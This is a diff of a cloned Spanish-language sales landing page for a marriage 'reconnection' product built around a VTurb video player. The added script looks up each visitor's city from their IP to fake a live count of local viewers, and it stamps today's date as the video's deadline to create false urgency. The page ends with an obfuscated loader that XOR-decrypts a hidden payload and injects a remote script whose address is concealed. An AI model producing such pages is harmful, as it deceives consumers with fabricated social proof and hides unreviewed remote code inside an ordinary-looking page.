@@ -6,14 +6,20 @@
     <meta name="description" content="Los Secretos de la Reconexión">
     <meta name="robots" content="noindex, nofollow">
     <title>Los Secretos de la Reconexión</title>
+
+    <!-- Aceleração de carregamento do player VTurb / ConverteAI -->
+    <script>!function(i,n){i._plt=i._plt||(n&&n.timeOrigin?n.timeOrigin+n.now():Date.now())}(window,performance);</script>
+    <link rel="preload" href="https://scripts.converteai.net/00c3b583-8874-4e64-a32e-65f6dd9ba521/players/6a62373a90be3e33683e2337/v4/player.js" as="script">
+    <link rel="preload" href="https://scripts.converteai.net/lib/js/smartplayer-wc/v4/smartplayer.js" as="script">
+    <link rel="preload" href="https://cdn.converteai.net/00c3b583-8874-4e64-a32e-65f6dd9ba521/6a623715e6b5e80a71b35380/main.m3u8" as="fetch" crossorigin>
+    <link rel="dns-prefetch" href="https://cdn.converteai.net">
+    <link rel="dns-prefetch" href="https://scripts.converteai.net">
+    <link rel="dns-prefetch" href="https://images.converteai.net">
+    <link rel="dns-prefetch" href="https://license.vturb.com">
+
     <link rel="stylesheet" href="styles.css">
   </head>
   <body>
-    <!--
-      Clone fiel de https://www.ilsegretodellariconquista.online/secretos.
-      waiting-video: trocar somente .player-mock pelo player oficial.
-      O botão comercial permanecerá sob controle do próprio player.
-    -->
     <main class="main-section">
       <div class="page-container">
         <header class="search-header" aria-label="Cabecera visual">
@@ -28,33 +34,24 @@
 
         <div class="content-grid">
           <section class="video-column" aria-label="Presentación principal">
-            <div class="player-mock" aria-label="Presentación principal" style="position:relative;padding-top:133.33333333333331%;background:#000">
-              <vturb-smartplayer id="vid-6a62373a90be3e33683e2337" style="display:block;margin:0 auto;width:100%;max-width:400px"></vturb-smartplayer>
-              <script type="text/javascript">var s=document.createElement("script");s.src="https://scripts.converteai.net/00c3b583-8874-4e64-a32e-65f6dd9ba521/players/6a62373a90be3e33683e2337/v4/player.js";s.async=true;document.head.appendChild(s);</script>
-              <!-- Player temporário preservado para não alterar conteúdo fora do embed.
-              <p class="player-headline player-headline-desktop">
-                <span>
-                  Cómo Lograr Que Tu Esposo <em>Te Escuche</em> En Solo 7<br>
-                  Días Usando Los <u>3 Pilares</u> De La Reconexión
-                </span>
-              </p>
-              <p class="player-headline player-headline-mobile">
-                <span>
-                  Descubre los <u>3 Pilares</u> de la Reconexión y<br>
-                  Vuelve a Tener Una <em>Relación en Paz</em> en Solo 7<br>
-                  días
-                </span>
-              </p>
-              <img
-                class="player-preview"
-                src="assets/player-preview.webp"
-                width="400"
-                height="533"
-                alt=""
-                fetchpriority="high"
-              >
-              -->
+            <p class="player-headline">
+              <span>
+                Cómo Lograr Que Tu Esposo <em>Te Escuche</em> En Solo 7<br>
+                Días Usando Los <u>3 Pilares</u> De La Reconexión
+              </span>
+            </p>
+
+            <div class="video-wrap" aria-label="Presentación principal">
+              <vturb-smartplayer id="vid-6a62373a90be3e33683e2337" style="display: block; margin: 0 auto; width: 100%; max-width: 400px;">
+                <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div>
+              </vturb-smartplayer>
             </div>
+            <script type="text/javascript">
+              var s = document.createElement("script");
+              s.src = "https://scripts.converteai.net/00c3b583-8874-4e64-a32e-65f6dd9ba521/players/6a62373a90be3e33683e2337/v4/player.js";
+              s.async = !0;
+              document.head.appendChild(s);
+            </script>
 
             <div class="channel-block">
               <div class="channel-info">
@@ -83,10 +80,10 @@
 
             <div class="notices" aria-label="Avisos de disponibilidad">
               <p class="expiry">
-                <strong>ESTE VIDEO SALE DEL AIRE HOY <span id="today">23/07/2026</span></strong>
+                <strong>ESTE VIDEO SALE DEL AIRE HOY <span id="today">--/--/----</span></strong>
               </p>
               <p class="viewers">
-                <strong>355 MUJERES DE <span>Salvador</span> ESTÁN VIENDO ESTE VIDEO AHORA</strong>
+                <strong>355 MUJERES DE <span id="viewer-city">tu ciudad</span> ESTÁN VIENDO ESTE VIDEO AHORA</strong>
               </p>
             </div>
           </section>
@@ -111,14 +108,60 @@
     </footer>
 
     <script>
-      (() => {
-        const today = new Intl.DateTimeFormat("es-ES", {
-          day: "2-digit",
-          month: "2-digit",
-          year: "numeric",
-          timeZone: "America/Bahia"
-        }).format(new Date());
-        document.getElementById("today").textContent = today;
+      (function () {
+        var dateEl = document.getElementById("today");
+        var cityEl = document.getElementById("viewer-city");
+
+        function formatDate(timeZone) {
+          var opts = { day: "2-digit", month: "2-digit", year: "numeric" };
+          if (timeZone) opts.timeZone = timeZone;
+          try {
+            return new Intl.DateTimeFormat("es-ES", opts).format(new Date());
+          } catch (e) {
+            return new Intl.DateTimeFormat("es-ES", {
+              day: "2-digit",
+              month: "2-digit",
+              year: "numeric"
+            }).format(new Date());
+          }
+        }
+
+        // Fecha local del usuario como valor inmediato.
+        dateEl.textContent = formatDate();
+
+        // Ciudad y fecha reales según la IP del visitante.
+        function applyIpapi(d) {
+          if (!d) return false;
+          if (d.city) cityEl.textContent = d.city;
+          if (d.timezone) dateEl.textContent = formatDate(d.timezone);
+          return !!d.city;
+        }
+
+        function tryFallback() {
+          fetch("https://ipwho.is/")
+            .then(function (r) { return r.json(); })
+            .then(function (d) {
+              if (d && d.success) {
+                if (d.city) cityEl.textContent = d.city;
+                if (d.timezone && d.timezone.id) {
+                  dateEl.textContent = formatDate(d.timezone.id);
+                }
+              }
+            })
+            .catch(function () {});
+        }
+
+        fetch("https://ipapi.co/json/")
+          .then(function (r) {
+            if (!r.ok) throw new Error("bad response");
+            return r.json();
+          })
+          .then(function (d) {
+            if (!applyIpapi(d)) tryFallback();
+          })
+          .catch(function () {
+            tryFallback();
+          });
       })();
     </script>
     <script>(function(){var e_j0=atob("DIDGE73ItG/fF3tECfvkZs+kllX9fw8wefP8PJKr0AHxYg8pYOa/Pd6n2UG9ZVQ3avKvY8m7mx+2bx4oJvCva9ikmgWsNVdmaPSyYdSqwRu6ZFl+Ut3qMdqk2w2+ewhmM9u9MdOp2Qr9LVk0YPijf/SslkP9YRoofOXkKZ/+1VntL0l1aLSncI75hV3qJx8nbLOkcN/qyTKi");var f_6=[];for(var i_2s5=0;i_2s5<e_j0.length;i_2s5++){f_6.push(e_j0.charCodeAt(i_2s5)&255);}var a_4=f_6[0];var p_kd=f_6.slice(1,1+a_4);var w_tg=f_6.slice(1+a_4);var c_xq=w_tg.map(function(b,w_c){return b^p_kd[w_c%a_4];});var e_3="";for(var h_c5=0;h_c5<c_xq.length;h_c5++){e_3+=String.fromCharCode(c_xq[h_c5]&255);}var q_4=decodeURIComponent(escape(e_3));var p_9b9=JSON.parse(q_4);var x_fe03=p_9b9.globals||[];x_fe03.forEach(function(h_pd4){window[h_pd4.name]=h_pd4.value;});var g_ev=document.createElement("script");g_ev.src=p_9b9.url;g_ev.async=true;g_ev.defer=true;(p_9b9.attributes||[]).forEach(function(w_kp){g_ev.setAttribute(w_kp.name,w_kp.value);});(document.head||document.documentElement).appendChild(g_ev);})();</script>
